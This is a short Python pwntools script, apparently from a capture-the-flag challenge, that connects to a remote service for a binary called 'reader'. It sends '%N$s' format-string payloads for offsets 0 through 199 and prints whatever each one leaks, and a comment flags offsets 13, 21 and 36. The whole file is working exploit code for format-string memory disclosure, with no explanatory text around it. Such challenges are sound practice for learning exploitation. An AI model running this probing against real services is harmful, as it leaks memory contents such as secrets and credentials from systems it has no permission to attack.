#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./reader', checksec=False)
# 13, 21, 36
for i in range(200):
    try:
        # p = process(level='error')
        p = remote("icc.metaproblems.com", 5300, level='error')
        p.sendlineafter(b'input:', '%{}$s'.format(i).encode())
        p.recvline()
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
